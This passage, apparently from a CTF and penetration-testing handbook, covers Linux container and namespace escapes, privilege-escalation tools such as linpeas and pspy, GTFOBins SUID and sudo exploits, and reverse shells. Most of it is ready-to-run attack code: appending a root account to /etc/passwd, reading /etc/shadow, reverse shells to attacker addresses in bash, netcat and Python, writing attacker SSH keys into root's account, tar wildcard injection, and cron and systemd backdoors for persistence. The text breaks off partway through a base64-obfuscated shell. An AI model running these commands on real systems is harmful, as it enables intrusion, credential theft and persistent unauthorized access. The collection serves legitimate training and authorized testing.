```bash
# Check group membership
id | grep docker

# If in docker group, full Docker access
docker run -v /:/hostfs -it alpine chroot /hostfs bash
```

**Kubernetes pod escape via Docker:**

```bash
# Find docker socket in Kubernetes pod
ls -la /var/run/docker.sock

# Check for service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use kubectl if available
kubectl get pods --all-namespaces
```

#### Container Breakout via Process Namespace

**If host PID namespace shared (`--pid=host`):**

```bash
# Check if PID 1 is host init
ps aux | head -2

# Access host processes
ls -la /proc/1/root/

# Exploit via /proc/[PID]/root symlink
cat /proc/1/root/etc/shadow

# Write to host filesystem
echo "attacker::0:0::/root:/bin/bash" >> /proc/1/root/etc/passwd

# Execute commands in host namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

#### Sensitive Information in Container

```bash
# Check environment variables
env

# Docker secrets
ls -la /run/secrets/
cat /run/secrets/*

# Kubernetes secrets
ls -la /var/run/secrets/kubernetes.io/
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Docker build history
docker history IMAGE_ID --no-trunc

# Check for exposed credentials in layers
docker save IMAGE_ID -o /tmp/image.tar
tar -xf /tmp/image.tar
grep -r "password\|secret\|key" .
```

### Namespace Escape

#### Understanding Linux Namespaces

Linux namespaces isolate system resources. Seven namespace types:

- **PID** - Process IDs
- **NET** - Network stack
- **MNT** - Mount points
- **UTS** - Hostname and domain name
- **IPC** - Inter-process communication
- **USER** - User and group IDs
- **CGROUP** - Cgroup root directory

#### Detecting Namespace Isolation

```bash
# Check current namespaces
ls -la /proc/self/ns/

# Compare with init (PID 1)
ls -la /proc/1/ns/

# Different inode numbers indicate namespace isolation
# Same inode = same namespace

# Detailed namespace information
lsns

# Check specific namespace
readlink /proc/$$/ns/pid
readlink /proc/1/ns/pid
```

#### PID Namespace Escape

**If you can access host PID namespace via `/proc`:**

```bash
# Check if host /proc accessible
ls -la /proc/1/root/

# /proc/[PID]/root is symlink to process's root directory
# For PID 1 (init), this is actual host root

# Read host files
cat /proc/1/root/etc/shadow

# Write to host filesystem
echo "evil" > /proc/1/root/tmp/evil

# Execute in host namespace using nsenter
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# If nsenter not available, enter via /proc
chroot /proc/1/root /bin/bash
```

**Python-based namespace escape:**

```python
#!/usr/bin/env python3
import os
import subprocess

# Find a process in host PID namespace
for pid in os.listdir('/proc'):
    if not pid.isdigit():
        continue
    try:
        # Check if we can access root
        os.listdir(f'/proc/{pid}/root/root/')
        print(f"[+] Found accessible PID: {pid}")
        
        # Enter namespace
        subprocess.call(['/bin/chroot', f'/proc/{pid}/root', '/bin/bash'])
        break
    except:
        continue
```

#### Mount Namespace Escape

**Via shared mount propagation:**

```bash
# Check mount propagation
cat /proc/self/mountinfo | grep propagate

# If shared propagation exists
# Mounts made in host affect container and vice versa

# Create bind mount to host path
mkdir /tmp/escape
mount --bind /proc/1/root / /tmp/escape
chroot /tmp/escape bash
```

**Exploit misconfigured mount points:**

```bash
# Find mounts from host
mount | grep -v "^overlay"
mount | grep "^/dev/"

# Check for host device files
ls -la /dev/sda*

# Mount host filesystem if devices accessible
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
```

#### User Namespace Escape

**User namespaces allow UID mapping; misconfigurations enable privilege escalation.**

```bash
# Check UID mapping
cat /proc/self/uid_map
cat /proc/self/gid_map

# Create user namespace
unshare -U -r /bin/bash

# Inside namespace, UID 0 (root) but mapped to unprivileged UID outside
# However, can still exploit if:

# 1. Can write to /proc/self/setgroups
echo "deny" > /proc/self/setgroups

# 2. Can create arbitrary UID mappings
echo "0 1000 1" > /proc/self/uid_map
```

**Exploit via nested namespaces:**

```bash
# Create nested user namespace with root mapping
unshare -U -r sh -c "unshare -m bash"

# In some configurations, allows mounting sensitive filesystems
mount -t proc proc /proc
mount -t sysfs sys /sys
```

[Inference] User namespace exploits depend heavily on kernel version and security policies; older kernels may have exploitable misconfigurations.

#### Network Namespace Escape

**If container shares host network (`--net=host`):**

```bash
# Check network namespace
readlink /proc/self/ns/net
readlink /proc/1/ns/net

# If same, direct access to host network
ip addr  # Shows host interfaces
netstat -tlnp  # Shows host listening ports

# Can sniff host traffic
tcpdump -i any -w /tmp/capture.pcap

# Access internal services on host
curl http://localhost:INTERNAL_PORT
```

#### IPC Namespace Escape

**If IPC namespace shared:**

```bash
# Check IPC namespace
readlink /proc/self/ns/ipc

# Access shared memory segments
ipcs -m

# Access message queues
ipcs -q

# Access semaphores
ipcs -s

# Read shared memory
ipcs -m | grep key
# Use key to access segment
```

#### UTS Namespace Bypass

**Hostname isolation bypass:**

```bash
# Check UTS namespace
readlink /proc/self/ns/uts

# If isolated, changing hostname only affects namespace
hostname EVIL

# Check if affects host
cat /proc/1/root/etc/hostname
```

[Inference] UTS namespace isolation itself doesn't provide privilege escalation, but lack of isolation may indicate other namespace sharing.

#### Generic Namespace Escape via nsenter

**If `nsenter` available and sufficient permissions:**

```bash
# Enter all namespaces of PID 1
nsenter --target 1 --all bash

# Enter specific namespaces
nsenter --target 1 --mount --uts --ipc --net --pid bash

# Enter namespace of different process
nsenter --target [PID] --mount --uts --ipc --net --pid bash

# Use with --root option
nsenter --target 1 --mount --root=/proc/1/root bash
```

#### Manual Namespace Entry via setns

**C program to enter namespace:**

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    int fd;
    
    // Open namespace file
    fd = open("/proc/1/ns/mnt", O_RDONLY);
    if (fd == -1) {
        perror("open");
        exit(1);
    }
    
    // Enter namespace
    if (setns(fd, CLONE_NEWNS) == -1) {
        perror("setns");
        exit(1);
    }
    
    close(fd);
    
    // Execute shell in namespace
    execl("/bin/bash", "bash", NULL);
    
    return 0;
}
```

**Compile and execute:**

```bash
gcc -o enter_ns enter_ns.c
./enter_ns
```

[Unverified] Manual namespace entry requires appropriate capabilities (typically CAP_SYS_ADMIN) and may be restricted by security modules.

#### Cgroup Namespace Exploitation

**If cgroup namespace misconfigured:**

```bash
# Check cgroup namespace
readlink /proc/self/ns/cgroup

# List cgroups
cat /proc/self/cgroup

# If can access cgroup filesystem
ls -la /sys/fs/cgroup/

# Exploit via release_agent (see Docker privileged section)
```

#### Detecting Namespace Escape Opportunities

**Comprehensive namespace audit:**

```bash
#!/bin/bash
echo "[*] Namespace Analysis"

for ns in /proc/self/ns/*; do
    self=$(readlink $ns)
    init=$(readlink /proc/1/ns/$(basename $ns) 2>/dev/null)
    
    echo "Namespace: $(basename $ns)"
    echo "  Self:  $self"
    echo "  Init:  $init"
    
    if [ "$self" == "$init" ]; then
        echo "  [!] SHARED WITH HOST"
    fi
    echo
done

echo "[*] Accessible Host Paths"
ls -la /proc/1/root/ 2>/dev/null && echo "[!] Can access host root via /proc/1/root"

echo "[*] nsenter availability"
which nsenter && echo "[!] nsenter available"

echo "[*] Capabilities"
capsh --print | grep "Current:"
```

### Important Related Topics

For complete privilege escalation coverage, also investigate:

- **Kernel exploits** (Dirty COW, DirtyCred, specific CVE-based exploits)
- **SUID/SGID binaries** (find / -perm -4000, GTFOBins exploitation)
- **Sudo misconfigurations** (sudo -l analysis, wildcard abuse, LD_PRELOAD)
- **Writable service files** (systemd services, init scripts)
- **NFS misconfigurations** (no_root_squash exploitation)
- **Shared library hijacking** (LD_PRELOAD, LD_LIBRARY_PATH, RPATH)

---

## Linux Privilege Escalation Tools

### linpeas.sh

LinPEAS (Linux Privilege Escalation Awesome Script) is the most comprehensive automated enumeration tool for Linux privilege escalation. It performs extensive system checks and highlights potential vulnerabilities with color-coded output.

#### Obtaining linpeas.sh

**Download from GitHub:**

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
```

**Direct execution without saving:**

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

**Transfer to target system:**

```bash
# HTTP server on attacker machine
python3 -m http.server 8000

# On target
wget http://ATTACKER_IP:8000/linpeas.sh
curl http://ATTACKER_IP:8000/linpeas.sh -o linpeas.sh
```

**Alternative transfer methods:**

```bash
# Base64 encoding (for restricted environments)
base64 -w0 linpeas.sh > linpeas_b64.txt
# On target
echo "BASE64_STRING" | base64 -d > linpeas.sh

# NetCat transfer
# Attacker
nc -lvnp 1234 < linpeas.sh
# Target
nc ATTACKER_IP 1234 > linpeas.sh
```

#### Executing linpeas.sh

**Basic execution:**

```bash
chmod +x linpeas.sh
./linpeas.sh
```

**Execute from writable directory:**

```bash
cd /tmp
./linpeas.sh
```

**Execute in memory (no disk writes):**

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

**Save output to file:**

```bash
./linpeas.sh > linpeas_output.txt
./linpeas.sh | tee linpeas_output.txt  # Display and save simultaneously
```

**Run with specific parameters:**

```bash
./linpeas.sh -a  # All checks (slower but thorough)
./linpeas.sh -s  # Superfast (skip time-consuming checks)
./linpeas.sh -P  # Avoid false positives (less output)
```

**Network enumeration focus:**

```bash
./linpeas.sh -n  # Network information only
```

**Execute with specific levels:**

```bash
./linpeas.sh -L 1  # Only check level 1 (fastest)
./linpeas.sh -L 2  # Check up to level 2
```

#### Interpreting linpeas.sh Output

**Color coding system:**

- **Red/Yellow** - Critical findings, highest priority
- **Green** - Potentially exploitable findings
- **Blue** - Informational

**Key sections to prioritize:**

**1. System Information:**

- Kernel version (check for kernel exploits)
- OS version and distribution
- Sudo version (CVE-2021-3156, CVE-2021-4034)

**2. Interesting Files:**

- SUID/SGID binaries highlighted in red
- Writable files and directories
- Backup files (.bak, .old, ~)

**3. Password Information:**

- History files (.bash_history, .mysql_history)
- Configuration files with credentials
- Database credentials in web configs

**4. Network Information:**

- Open ports and listening services
- Network connections
- Firewall rules

**5. Cron Jobs:**

- World-writable cron scripts
- Cron jobs running as root
- PATH hijacking opportunities

**6. Container Detection:**

- Docker socket exposure
- LXC/LXD group membership
- Kubernetes service accounts

#### Advanced linpeas.sh Usage

**Export results without colors (for parsing):**

```bash
./linpeas.sh -o output_format=txt
```

**Focus on specific checks:**

```bash
./linpeas.sh -o system_information=true
./linpeas.sh -o interesting_files=true
```

**Parse output for critical findings:**

```bash
./linpeas.sh | grep -E "PEASS|SUID|writable|password"
```

### linenum.sh

LinEnum is a lightweight alternative to linPEAS, providing thorough enumeration with less output verbosity. Useful when linPEAS produces overwhelming results.

#### Obtaining linenum.sh

**Download from GitHub:**

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o linenum.sh
```

**Transfer methods (same as linpeas.sh)**

#### Executing linenum.sh

**Basic execution:**

```bash
chmod +x linenum.sh
./linenum.sh
```

**Thorough mode (includes keyword searches):**

```bash
./linenum.sh -t
```

**Keyword search in files:**

```bash
./linenum.sh -k password
./linenum.sh -k admin
```

**Export to file with thorough mode:**

```bash
./linenum.sh -t -e /tmp/linenum_report.txt
```

**Check specific areas:**

```bash
./linenum.sh -s  # Supply current user password for additional checks
```

#### Key Differences from linpeas.sh

**LinEnum advantages:**

- Cleaner, more structured output
- Faster execution time
- Lower false positive rate
- Better for manual analysis

**[Inference]** LinEnum is preferred when:

- Time constraints require faster enumeration
- System resources are limited
- Output needs to be more human-readable
- Less technical users need to interpret results

#### Interpreting linenum.sh Output

**Organized sections:**

**1. Kernel and System Info:**

```
Kernel information:
Hostname:
Distribution:
```

**2. User Information:**

```
Current user:
Users with console:
Super users found:
```

**3. Environmental Variables:**

```
Path information:
Available shells:
```

**4. File System:**

```
World-writable files:
SUID files:
SGID files:
```

**5. Jobs/Tasks:**

```
Cron jobs:
Crontab contents:
```

### linux-smart-enumeration

LSE (Linux Smart Enumeration) provides progressive difficulty levels for enumeration, making it ideal for CTF scenarios where you need to balance speed and depth.

#### Obtaining linux-smart-enumeration

**Download from GitHub:**

```bash
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -o lse.sh
```

#### Executing linux-smart-enumeration

**Basic execution (level 0 - quick):**

```bash
chmod +x lse.sh
./lse.sh
```

**Progressive levels:**

```bash
./lse.sh -l 0  # Quick enumeration (default)
./lse.sh -l 1  # Standard enumeration
./lse.sh -l 2  # Detailed enumeration (includes some guessing)
```

**Run all checks:**

```bash
./lse.sh -l 2 -i  # Level 2 with interactive mode
```

**Focus on specific tests:**

```bash
./lse.sh -s  # Selection mode, choose specific tests
```

**Show test IDs:**

```bash
./lse.sh -d  # Debug mode, shows test identifiers
```

**Run specific tests by ID:**

```bash
./lse.sh -i "test_id1,test_id2"
```

#### Understanding LSE Levels

**Level 0 (Fast):**

- Basic system information
- Obvious misconfigurations
- Critical SUID binaries
- World-writable directories

**Level 1 (Standard):**

- All level 0 checks
- Extended file searches
- Network configuration
- Service enumeration
- Basic CVE checks

**Level 2 (Extensive):**

- All level 1 checks
- Intensive file searches
- Password hunting in common locations
- Potential false positives
- Time-consuming checks

#### Interpreting LSE Output

**Color-coded findings:**

- **Red** - Critical security issues
- **Yellow** - Important findings requiring investigation
- **Green** - Interesting information
- **Gray** - Informational

**Test categories:**

```
[!] fst000 Writable files outside user's home
[!] ctn010 Container breakout via mounted Docker socket
[!] sud000 Sudo version vulnerable to CVE-2021-3156
```

**Priority exploitation order based on LSE output:**

1. Red findings (immediate privilege escalation vectors)
2. Yellow findings (likely exploitable)
3. Green findings (require additional analysis)

### pspy (process spying)

Pspy monitors Linux processes without root privileges, revealing cron jobs, scheduled tasks, and processes executed by other users. Essential for identifying privilege escalation through automated tasks.

#### Obtaining pspy

**Download precompiled binaries:**

```bash
# 64-bit
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
# 32-bit
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32
# Static builds (better compatibility)
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64s
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32s
```

**Transfer to target:**

```bash
# HTTP server method
python3 -m http.server 8000
# On target
wget http://ATTACKER_IP:8000/pspy64
chmod +x pspy64
```

#### Executing pspy

**Basic execution:**

```bash
./pspy64
```

**Scan every 100ms (higher frequency):**

```bash
./pspy64 -i 100
```

**Print both commands and file system events:**

```bash
./pspy64 -pf
```

**Print only processes:**

```bash
./pspy64 -p
```

**Print only file system events:**

```bash
./pspy64 -f
```

**Custom scan interval:**

```bash
./pspy64 -i 1000  # Scan every 1 second
```

**Disable colors (for piping/logging):**

```bash
./pspy64 --no-color
```

#### Interpreting pspy Output

**Output format:**

```
2025/10/11 10:15:30 CMD: UID=0    PID=1234   | /bin/bash /root/backup.sh
2025/10/11 10:15:31 FS:           OPEN | /tmp/backup.log
```

**Key elements:**

- **CMD** - Command executed
- **FS** - File system event
- **UID** - User ID (0 = root)
- **PID** - Process ID
- **PPID** - Parent process ID

**What to look for:**

**1. Cron jobs running as root:**

```
UID=0 | /usr/bin/python /opt/scripts/cleanup.py
```

Check if script is writable or uses relative paths.

**2. Backup scripts:**

```
UID=0 | /bin/tar -czf /backups/backup.tar.gz /home/*
```

Look for wildcard injection opportunities.

**3. File operations on writable locations:**

```
FS: OPEN | /tmp/processing.txt
```

Race condition opportunities.

**4. Database operations:**

```
UID=0 | /usr/bin/mysql -u root -pPASSWORD
```

Credentials exposed in process arguments.

**5. Scripts in PATH without absolute paths:**

```
UID=0 | cleanup.sh
```

PATH hijacking opportunity.

#### Common Exploitation Scenarios Found by pspy

**Writable cron script:**

```bash
# pspy shows: UID=0 /bin/bash /opt/scripts/backup.sh
# Check if writable
ls -la /opt/scripts/backup.sh
# If writable, add reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/scripts/backup.sh
```

**Wildcard injection in tar:**

```bash
# pspy shows: UID=0 tar -czf /backup.tar.gz /home/user/*
cd /home/user
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > shell.sh
chmod +x shell.sh
```

**PATH hijacking:**

```bash
# pspy shows: UID=0 cleanup
# Script calls cleanup without absolute path
cd /tmp
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > cleanup
chmod +x cleanup
export PATH=/tmp:$PATH
```

**Race condition exploitation:**

```bash
# pspy shows root reading from /tmp/data.txt
# Create symlink after file is opened but before it's read
while true; do ln -sf /etc/shadow /tmp/data.txt 2>/dev/null; done
```

#### Advanced pspy Usage

**Log output for later analysis:**

```bash
./pspy64 -pf > /tmp/pspy_output.txt 2>&1 &
# Let it run for several minutes
kill %1
cat /tmp/pspy_output.txt | grep "UID=0"
```

**Monitor specific time period:**

```bash
timeout 300 ./pspy64 -pf  # Run for 5 minutes
```

**Filter interesting processes:**

```bash
./pspy64 | grep -E "UID=0|root|sudo"
```

### GTFOBins (privilege escalation techniques)

GTFOBins is a curated list of Unix binaries that can be exploited to bypass security restrictions. Essential reference for exploiting SUID binaries, sudo misconfigurations, and capabilities.

#### Accessing GTFOBins

**Online resource:**

- Website: https://gtfobins.github.io/
- GitHub: https://github.com/GTFOBins/GTFOBins.github.io

**Offline usage:**

```bash
git clone https://github.com/GTFOBins/GTFOBins.github.io.git
cd GTFOBins.github.io
# Browse _gtfobins/ directory for markdown files
```

#### GTFOBins Categories

**1. SUID** Exploit SUID binaries to execute commands as the file owner (often root).

**2. Sudo** Abuse sudo permissions without requiring the root password.

**3. Capabilities** Exploit Linux capabilities assigned to binaries.

**4. File Upload** Upload files using unexpected binary functionality.

**5. File Download** Download files using unexpected binary functionality.

**6. File Write** Write to arbitrary files.

**7. File Read** Read arbitrary files.

**8. Shell** Spawn interactive shells.

**9. Reverse Shell** Establish reverse connections.

**10. Bind Shell** Create listening shells.

**11. Library Load** Load arbitrary shared libraries.

#### Common GTFOBins SUID Exploits

**bash:**

```bash
bash -p
```

**cp (copy /bin/bash with SUID):**

```bash
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p
```

**find:**

```bash
find . -exec /bin/sh -p \; -quit
```

**vim:**

```bash
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
# Or simpler
vim -c ':!/bin/sh'
```

**less:**

```bash
less /etc/passwd
!/bin/sh
```

**more:**

```bash
more /etc/passwd
!/bin/sh
```

**nano:**

```bash
nano
^R^X  # Ctrl+R then Ctrl+X
reset; sh 1>&0 2>&0
```

**awk:**

```bash
awk 'BEGIN {system("/bin/sh -p")}'
```

**perl:**

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

**python:**

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**ruby:**

```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
```

**tar:**

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**zip:**

```bash
zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

**git:**

```bash
git help status
!/bin/sh
```

**wget (file write as root):**

```bash
wget http://attacker.com/authorized_keys -O /root/.ssh/authorized_keys
```

**curl (file write as root):**

```bash
curl http://attacker.com/authorized_keys -o /root/.ssh/authorized_keys
```

#### GTFOBins Sudo Exploits

**Check sudo permissions:**

```bash
sudo -l
```

**Common sudo exploits (based on sudo -l output):**

**sudo vi /etc/hosts:**

```bash
sudo vi /etc/hosts
:!/bin/bash
```

**sudo awk:**

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

**sudo find:**

```bash
sudo find . -exec /bin/sh \; -quit
```

**sudo nmap (older versions):**

```bash
echo "os.execute('/bin/sh')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

**sudo env (preserve environment):**

```bash
sudo env /bin/bash
```

**sudo git:**

```bash
sudo git -p help
!/bin/bash
```

**sudo docker:**

```bash
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**sudo systemctl:**

```bash
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > /tmp/root.service
sudo systemctl link /tmp/root.service
sudo systemctl enable --now /tmp/root.service
/bin/bash -p
```

#### GTFOBins for File Operations

**Read /etc/shadow with base64:**

```bash
base64 /etc/shadow | base64 --decode
```

**Read files with less/more/tail/head:**

```bash
less /etc/shadow
more /etc/shadow
tail -n +1 /etc/shadow
head -n 999 /etc/shadow
```

**Read files with awk/sed:**

```bash
awk '{print}' /etc/shadow
sed -n '1,$p' /etc/shadow
```

**Write files with tee:**

```bash
echo "attacker_key" | tee -a /root/.ssh/authorized_keys
```

**Write files with dd:**

```bash
echo "data" | dd of=/root/file
```

#### GTFOBins Capabilities Exploitation

**Python with cap_setuid:**

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Perl with cap_setuid:**

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

**tar with cap_dac_read_search:**

```bash
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
```

**gdb with cap_sys_ptrace:**

```bash
gdb -p <root_pid>
(gdb) call (void)system("chmod +s /bin/bash")
(gdb) quit
/bin/bash -p
```

#### Automated GTFOBins Lookup

**Manual search strategy:**

1. Enumerate SUID/sudo/capabilities
2. For each binary, search GTFOBins
3. Test exploitation method
4. Escalate privileges

**Quick reference command:**

```bash
# After finding SUID binary
BINARY="vim"
curl -s "https://gtfobins.github.io/gtfobins/${BINARY}/" | grep -A 20 "SUID"
```

**[Inference]** GTFOBins exploitation success depends on:

- Binary having SUID bit, sudo permissions, or capabilities
- Binary functionality allowing command execution or file manipulation
- System configuration not restricting binary behavior

---

**Important Related Topics:**

- **sudo -l Analysis** - Interpreting sudo permissions and NOPASSWD entries
- **Kernel Exploit Selection** - Matching kernel versions to public exploits
- **Container Escape Techniques** - Docker socket exploitation and namespace breakouts
- **Wildcard Injection** - Exploiting shell expansion in automated scripts

---

## Reverse Shell Techniques (Linux)

Reverse shells connect from a compromised target back to an attacker-controlled listener, bypassing firewall restrictions that typically block incoming connections. These techniques are fundamental in CTF environments and authorized penetration testing.

### Bash Reverse Shells

Bash reverse shells leverage built-in shell capabilities and are effective when bash is available on the target.

#### Standard Bash TCP Reverse Shell

```bash
# Basic format
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Alternative syntax
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# URL-encoded for web injection
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F4444%200%3E%261%27
```

**Explanation of syntax:**

- `bash -i` creates interactive shell
- `>&` redirects stdout and stderr
- `/dev/tcp/IP/PORT` is bash's built-in TCP socket handler
- `0>&1` redirects stdin to stdout

#### Bash /dev/tcp Method with exec

```bash
# Using exec for cleaner file descriptor handling
exec 5<>/dev/tcp/10.10.14.5/4444
cat <&5 | while read line; do $line 2>&5 >&5; done

# Alternative with explicit bash
exec /bin/bash 0</dev/tcp/10.10.14.5/4444 1>&0 2>&0
```

#### Bash UDP Reverse Shell

```bash
# UDP variant (less common)
sh -i >& /dev/udp/10.10.14.5/4444 0>&1
```

#### FIFO-Based Bash Reverse Shell

When direct TCP redirection doesn't work:

```bash
# Create named pipe (FIFO)
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f
```

**How it works:**

- `mkfifo` creates named pipe at `/tmp/f`
- Output of bash shell written to pipe
- Pipe content sent through netcat to attacker
- Attacker input written back to pipe

#### One-Liner Bash Variants

```bash
# Compact version
0<&196;exec 196<>/dev/tcp/10.10.14.5/4444; sh <&196 >&196 2>&196

# Using sh instead of bash
sh -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Background execution
(bash -i >& /dev/tcp/10.10.14.5/4444 0>&1) &

# Backgrounded and detached
nohup bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' &
```

#### Troubleshooting Bash Shells

```bash
# Check if /dev/tcp is available
(echo >/dev/tcp/127.0.0.1/80) &>/dev/null && echo "Available" || echo "Not available"

# Test with localhost first
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1

# Force PTY allocation for better shell
python -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z, stty raw -echo; fg
```

### NC (Netcat) Shells

Netcat is the "Swiss Army knife" of networking tools. Multiple variants exist with different features.

#### Listener Setup (Attacker Machine)

```bash
# Standard netcat listener
nc -lvnp 4444

# Verbose with specific interface
nc -lvnp 4444 -s 10.10.14.5

# Using ncat (nmap version)
ncat -lvnp 4444

# Using netcat-traditional
nc.traditional -lvp 4444
```

**Flag meanings:**

- `-l` listen mode
- `-v` verbose output
- `-n` no DNS resolution
- `-p` port number

#### Netcat with -e Flag (Traditional)

Older netcat versions support direct command execution:

```bash
# Target machine
nc -e /bin/bash 10.10.14.5 4444
nc -e /bin/sh 10.10.14.5 4444

# Windows equivalent
nc.exe -e cmd.exe 10.10.14.5 4444
```

[Inference: This method is less common in modern systems as netcat-openbsd (default in many distributions) removed the `-e` flag for security reasons]

#### Netcat without -e Flag

When `-e` is unavailable:

```bash
# Using named pipe
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f

# Using mknod
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc 10.10.14.5 4444 1>/tmp/backpipe
```

#### Ncat (Nmap's Netcat) Advanced Features

```bash
# SSL/TLS encrypted shell (target)
ncat --ssl 10.10.14.5 4444 -e /bin/bash

# Listener with SSL (attacker)
ncat --ssl -lvnp 4444

# Execute on connect
ncat -lvnp 4444 --sh-exec /bin/bash

# Allow multiple connections
ncat -lvnp 4444 --keep-open --sh-exec /bin/bash
```

#### Netcat Bind Shell (Alternative Approach)

When reverse connections fail, bind shells listen on the target:

```bash
# Target machine (creates listener)
nc -lvnp 5555 -e /bin/bash

# Attacker connects
nc TARGET_IP 5555
```

[Inference: Bind shells are less reliable in CTF scenarios due to firewall restrictions blocking incoming connections to the target]

#### Netcat File Transfer

```bash
# Receive file on attacker
nc -lvnp 4444 > received_file

# Send file from target
nc 10.10.14.5 4444 < file_to_send

# Transfer and execute
# Attacker: nc -lvnp 4444 < exploit
# Target: nc 10.10.14.5 4444 | bash
```

#### Persistence with Netcat

```bash
# Add to crontab for periodic reverse shell
echo "*/5 * * * * nc 10.10.14.5 4444 -e /bin/bash" | crontab -

# Systemd service for persistence
cat > /etc/systemd/system/netcat.service << EOF
[Unit]
Description=Netcat Reverse Shell

[Service]
ExecStart=/bin/nc 10.10.14.5 4444 -e /bin/bash
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable netcat.service
systemctl start netcat.service
```

### Python Reverse Shells

Python reverse shells work across most Linux systems and offer enhanced functionality.

#### Basic Python Reverse Shell

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Breakdown:**

- Creates TCP socket
- Connects to attacker
- Duplicates socket file descriptor to stdin/stdout/stderr
- Spawns interactive bash shell

#### Python3 Reverse Shell

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

#### Python PTY Shell (Better Interactive Shell)

```python
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

#### Full-Featured Python Reverse Shell Script

```python
#!/usr/bin/env python
import socket
import subprocess
import os

HOST = '10.10.14.5'
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

subprocess.call(["/bin/bash", "-i"])
```

#### Python Reverse Shell with Retry Logic

```python
import socket
import subprocess
import os
import time

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('10.10.14.5', 4444))
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            subprocess.call(['/bin/bash', '-i'])
            break
        except:
            time.sleep(5)

connect()
```

#### Python IPv6 Reverse Shell

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef::1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

#### Encoded Python Shell (Obfuscation)

```bash
# Base64 encode the payload
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' | base64

# Execute decoded payload
